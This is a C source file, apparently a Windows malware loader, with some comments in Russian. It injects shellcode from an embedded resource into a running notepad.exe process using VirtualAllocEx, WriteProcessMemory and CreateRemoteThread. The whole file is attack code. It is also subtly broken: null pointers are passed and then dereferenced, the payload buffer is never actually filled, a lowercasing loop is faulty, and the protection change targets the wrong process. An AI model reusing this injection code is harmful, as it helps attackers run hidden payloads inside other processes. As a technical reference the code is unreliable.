#include <Windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>
#include "rsrc.h"

BOOL getRemoteProcessHandle(LPWSTR szProcName, DWORD* dwProcId, HANDLE* hProcess) {
    PROCESSENTRY32W Proc = {
        .dwSize = sizeof(PROCESSENTRY32W)
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed: %lu", GetLastError());
        return FALSE;
    }

    if (!Process32FirstW(hSnapshot, &Proc)) {
        printf("Process32FirstW failed: %lu", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        WCHAR lowercaseName[MAX_PATH] = {0};
        WCHAR* ptrLower = lowercaseName;

        if (*Proc.szExeFile) {
            for (WCHAR* c = Proc.szExeFile; *c != '\0' && (lowercaseName-ptrLower) < MAX_PATH; ++c) {
                *ptrLower = (WCHAR)tolower(*c);
            }

            if (wcscmp(lowercaseName, szProcName) == 0) {
                *dwProcId = Proc.th32ProcessID;
                *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

                if (*hProcess == NULL) {
                    printf("OpenProcess failed: %lu", GetLastError());
                    CloseHandle(hSnapshot);
                    return FALSE;
                }

                break;
            }
        }

    } while (Process32NextW(hSnapshot, &Proc));


    CloseHandle(hSnapshot);
    return TRUE;
}

BOOL injectShellcode(HANDLE hProc, char* pShellcode, SIZE_T shellcodeSize) {
    LPVOID pMem = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pMem == NULL) {
        printf("VirtualAllocEx failed: %lu", GetLastError());
        return FALSE;
    }

    SIZE_T actuallyWritten = 0;
    if (!WriteProcessMemory(hProc, pMem, pShellcode, shellcodeSize, &actuallyWritten) || 
        actuallyWritten != shellcodeSize)
    {
        printf("WriteProcessMemory failed: %lu", GetLastError());
        return FALSE;
    }

    memset(pShellcode, 0, shellcodeSize);

    DWORD oldProtect = 0;
    if (!VirtualProtect(pMem, shellcodeSize, PAGE_EXECUTE, &oldProtect)) {
        printf("VirtualProtect failed: %lu", GetLastError());
        return FALSE;
    }

    if (CreateRemoteThread(hProc, NULL, 0, pMem, NULL, 0, NULL) == NULL) {
        printf("CreateRemoteThread failed: %lu", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL readResourceShellcode(PVOID pPayloadAddress, SIZE_T* sPayloadSize) {
    HRSRC   hRsrc   = NULL;
    HGLOBAL hGlobal = NULL;

    hRsrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (hRsrc == NULL) {
        printf("FindResource failed: %lu", GetLastError());
        return FALSE;
    }

    // Получаем дескриптор для LockResource
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        printf("LoadResource failed: %lu", GetLastError());
        return FALSE;
    }

    // Получаем адрес нашей полезной нагрузки
    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        printf("LockResource failed: %lu", GetLastError());
        return FALSE;
    }

    // Получаем размер полезной нагрузки
    *sPayloadSize = SizeofResource(NULL, hRsrc);
    if (sPayloadSize == 0) {
        printf("SizeofResource failed: %lu", GetLastError());
        return FALSE;
    }

    return TRUE;
} 

int main() {
    LPWSTR  procName = L"notepad.exe";
    DWORD*  dwProcId = NULL;
    PHANDLE hProcess = NULL;
    if (!getRemoteProcessHandle(procName, dwProcId, hProcess)) {
        printf("GetRemoteProcessHandle failed!");
        return 1;
    }

    char buf[1024] = {};
    SIZE_T size = 0;
    if (!readResourceShellcode((void*)buf, &size)) {
        printf("readResourceShellcode failed!");
        return 2;
    }

    if (!injectShellcode(*hProcess, buf, size)) {
        printf("injectShellcode failed!");
        return FALSE;
    }

    return 0;
}